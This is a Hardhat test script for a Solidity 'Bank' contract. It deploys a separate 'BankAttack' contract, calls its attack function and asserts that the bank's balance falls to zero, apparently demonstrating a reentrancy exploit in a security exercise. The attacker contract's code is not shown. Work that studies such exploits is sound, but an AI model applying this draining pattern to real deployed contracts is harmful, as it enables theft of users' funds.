const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe('Bank', function() {
  it('Bank reentrancy', async function() {
    const provider = waffle.provider;
    const [owner] = await ethers.getSigners();

    const Bank = await ethers.getContractFactory("Bank");
    const bank = await Bank.deploy();
    await bank.deployed();
    const tx1 = await owner.sendTransaction({to: bank.address, value: ethers.utils.parseEther('0.01')})
    await tx1.wait();

    const BankAttack = await ethers.getContractFactory("BankAttack");
    const bankAttack = await BankAttack.deploy(bank.address);
    await bankAttack.deployed();

    const tx4 = await owner.sendTransaction({to: bankAttack.address, value: ethers.utils.parseEther('0.0001')})
    await tx4.wait();

    const bankBalanceBefore = ethers.utils.formatEther(await provider.getBalance(bank.address));
    expect(bankBalanceBefore).to.eq('0.01');

    const ruble = ethers.utils.parseEther('0.005');

    const tx2 = await bank.deposit(bankAttack.address, {value: ruble})
    await tx2.wait();

    expect(await bank.balanceOf(bankAttack.address)).eq(ruble);

    const tx3 = await bankAttack.attack();
    await tx3.wait();

    const bankBalanceAfter = ethers.utils.formatEther(await provider.getBalance(bank.address));
    expect(bankBalanceAfter).to.eq('0.0');
  })
}) 